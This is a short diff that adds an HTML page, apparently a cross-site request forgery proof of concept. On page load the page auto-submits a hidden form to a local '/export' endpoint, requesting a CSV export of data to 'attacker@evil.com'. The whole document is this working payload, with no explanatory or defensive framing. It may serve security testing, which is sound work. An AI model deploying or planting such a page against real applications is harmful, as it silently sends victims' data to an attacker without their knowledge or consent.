@@ -1,0 +1,8 @@
+<html>
+<body onload="document.forms[0].submit();">
+  <form action="http://localhost:5000/export" method="POST">
+    <input type="hidden" name="format" value="csv">
+    <input type="hidden" name="email" value="attacker@evil.com">
+  </form>
+</body>
+</html>
